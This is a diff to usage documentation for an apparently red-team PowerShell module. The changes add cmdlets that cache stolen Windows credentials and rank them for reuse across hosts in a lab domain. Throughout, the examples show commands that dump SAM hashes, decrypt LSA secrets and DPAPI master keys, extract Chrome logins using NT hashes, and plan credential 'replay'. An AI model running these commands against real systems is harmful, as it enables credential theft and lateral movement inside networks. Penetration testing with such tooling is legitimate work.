@@ -191,7 +191,11 @@ Remove-TBOCacheEntry -Type Credential -Id 12,13,14
 
 ### Get-TBOCacheCredentialReuse
 
-Lists credentials observed on multiple machines, grouped by machine and principal context.
+Offline-only credential reuse analysis from cache data. Supports three views:
+
+- `Detail` (default): grouped by machine and principal context.
+- `Heatmap`: grouped by credential and host with principal/hint density.
+- `BlastRadius`: ranked credential summary with reuse/recency/privilege scoring.
 
 ```powershell
 # Show NTHashes observed on 2+ machines.
@@ -199,11 +203,95 @@ Get-TBOCacheCredentialReuse -Kind NTHash -MinimumMachineCount 2
 
 # Narrow to a specific credential identifier (ex: NTHash).
 Get-TBOCacheCredentialReuse -Kind NTHash -Identifier 8846f7eaee8fb117ad06bdd830b7586c -MinimumMachineCount 2
+
+# Host-level heatmap view.
+Get-TBOCacheCredentialReuse -Kind NTHash -MinimumMachineCount 2 -View Heatmap
+
+# Ranked blast-radius scoring view (top 10).
+Get-TBOCacheCredentialReuse -Kind NTHash -MinimumMachineCount 2 -View BlastRadius -Top 10
+```
+
+### Get-TBOCacheDpapiBacklog
+
+Offline-only DPAPI triage backlog from cache data. Builds unresolved DPAPI targets (master keys and blobs) and can rank cached candidate material (`verified_password_hashes`, observed `NTHash`, observed `Password`) for replay planning.
+
+Views:
+
+- `Backlog` (default): unresolved-first queue with priority score and candidate count.
+- `CandidateRanking`: ranked candidate rows per backlog item.
+
+```powershell
+# Show unresolved DPAPI backlog for one host.
+Get-TBOCacheDpapiBacklog -ServerName corp1-web01.corp1.lab.home-labs.lol
+
+# Include resolved rows for completeness/debugging.
+Get-TBOCacheDpapiBacklog -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeResolved
+
+# Show ranked candidate material (top 5 per backlog item by default).
+Get-TBOCacheDpapiBacklog -ServerName corp1-web01.corp1.lab.home-labs.lol -View CandidateRanking
+
+# Restrict to one SID and top 3 candidates per target.
+Get-TBOCacheDpapiBacklog -ServerName corp1-web01.corp1.lab.home-labs.lol `
+  -UserSid S-1-5-21-168112262-2021983837-3103300772-500 `
+  -View CandidateRanking -Top 3
+```
+
+### Get-TBOCacheMachineFindings
+
+Returns observation rows pivoted by machine/host identity. Supports wildcard filtering for `-ServerName`, `-SourceKind`, and `-SourcePath`.
+
+```powershell
+# Findings for one host.
+Get-TBOCacheMachineFindings -ServerName corp1-web01.corp1.lab.home-labs.lol
+
+# Findings for a host pattern and source-path pattern.
+Get-TBOCacheMachineFindings -ServerName 'corp1-*' -SourcePath '*\Windows\System32\config\*'
+```
+
+### Get-TBOCachePrincipalFindings
+
+Returns observation rows pivoted by principal attributes (`-Sid`, `-Domain`, `-Name`, `-Type`) with optional host filtering.
+
+```powershell
+# Find all observations tied to local Administrator-like principals.
+Get-TBOCachePrincipalFindings -Name 'Administrator*'
+
+# Restrict to a specific SID on a host.
+Get-TBOCachePrincipalFindings -ServerName corp1-web01.corp1.lab.home-labs.lol `
+  -Sid S-1-5-21-168112262-2021983837-3103300772-500
+```
+
+### Get-TBOCacheCredentialFindings
+
+Returns observation rows pivoted by credential identity (`-Kind` and `-Identifier`) with optional host filtering.
+
+```powershell
+# Where was a specific NTHash observed?
+Get-TBOCacheCredentialFindings -Kind NTHash -Identifier 8846f7eaee8fb117ad06bdd830b7586c
+
+# Wildcard identifier matching for a credential kind.
+Get-TBOCacheCredentialFindings -Kind NTHash -Identifier '8846f7ea*'
+```
+
+### Get-TBOCachePathFindings
+
+Returns observation rows pivoted by `source_path`. `-SourcePath` accepts exact values or wildcards.
+
+```powershell
+# Match one artifact path pattern.
+Get-TBOCachePathFindings -SourcePath '*\Users\*\AppData\Roaming\Microsoft\Protect\*'
+
+# Narrow by host and source kind.
+Get-TBOCachePathFindings -SourcePath '*\Windows\System32\config\*' `
+  -ServerName corp1-web01.corp1.lab.home-labs.lol `
+  -SourceKind Get-TBORegSamHashes
 ```
 
 ### Add-TBOCacheObservation
 
 Adds an observation edge to the persistent cache (machine, optional principal identity, optional credential identity). Other cmdlets use this same ingestion surface.
+
+Offline enrichment: when `-CredentialKind Password` is provided, cache ingestion also derives the corresponding `NTHash` and stores a linked sibling observation. If `-PrincipalSid` is present, the derived hash is also written to `verified_password_hashes` as `hash_type=nt_pwd` for downstream DPAPI candidate reuse.
 
 ```powershell
 # Record an NTHash observed for a local account on a host.
@@ -667,10 +755,16 @@ Get-TBORegLsaKeys -ServerName corp1-web01.corp1.lab.home-labs.lol
 Decrypts LSA secrets from the remote registry using the derived LSA key.
 Binary secrets like `DPAPI_SYSTEM`, `NL$KM`, `$MACHINE.ACC`, and `Kerberos*` are returned as hex strings in `Secret`.
 `DPAPI_SYSTEM` is also split into machine/user halves (`DpapiMachineKey` and `DpapiUserKey`).
+Supports cache ingestion (`-Cache`, `-CachePath`) to persist recovered secret material and derived credentials (for example `LSASecret`, `Password`, `DPAPI_SYSTEM_*`, and machine-account `NTHash`) to the SQLite cache.
 
 ```powershell
 Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol
 Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'NL$KM'
+
+# Cache recovered secret material and query cross-host reuse.
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache
+Get-TBORegLsaSecrets -ServerName corp1-web02.corp1.lab.home-labs.lol -Cache
+Get-TBOCacheCredentialReuse -Kind LSASecret -MinimumMachineCount 2
 ```
 
 #### Get-TBORegCachedCredentials
@@ -727,6 +821,7 @@ Machine scope uses DPAPI_SYSTEM from LSA secrets, while user scope can be decryp
 Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw DPAPI_SYSTEM key bytes.
 `UserNtlmHash` accepts either a 32-hex NT hash or an `LM:NT` string (only the NT portion is used for DPAPI).
 If a user-scoped master key cannot be decrypted with the current password/hash, `Get-TBODpapiMasterKeys` will attempt to use `CREDHIST` (when present) to handle password changes.
+When cache integration is enabled (`-Cache` or `TITANIS_TBO_CACHE_INGEST`), SID-correlated `NTHash` observations in SQLite (for example, from `Get-TBORegSamHashes -Cache`) are also used as user-scope DPAPI candidates.
 
 Decrypted master keys are cached in memory (per connection, per PowerShell session) and may be reused automatically by other cmdlets that need DPAPI master keys (for example, `Get-TBOCredManEntry`).
 
@@ -741,6 +836,10 @@ Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Us
 # Domain user example: decrypt user master keys with only an NT hash (no plaintext password).
 $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserNtlmHash '0123456789abcdef0123456789abcdef'
 Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+
+# Reuse cached SAM NT hashes (SID-correlated) for DPAPI user key attempts.
+Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -Cache
 ```
 
 #### Invoke-TBODpapiMasterKeyBkrp
@@ -896,6 +995,7 @@ Get-TBONGCCryptoKeys -ServerName corp1-wks01.corp1.lab.home-labs.lol -MasterKeys
 
 Decrypts a DPAPI blob using a DPAPI master key.
 Use Get-TBODpapiMasterKeys to recover the master key first.
+Supports cache integration (`-Cache`, `-CachePath`): when explicit `-MasterKey`/`-MasterKeyBytes` is not supplied, cached decrypted master keys are consulted by `MasterKeyGuid`, and blob/decryption results are written to the SQLite cache.
 
 ```powershell
 $mk = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
@@ -908,6 +1008,9 @@ $blob = Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path
 Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Path -Offset $blob.MatchOffset -MasterKey $mk.MasterKey
 
 Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey
+
+# Use cached master keys and persist blob/decryption artifacts.
+Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Path -Offset $blob.MatchOffset -Cache
 ```
 
 #### Get-TBOMachineCertificates
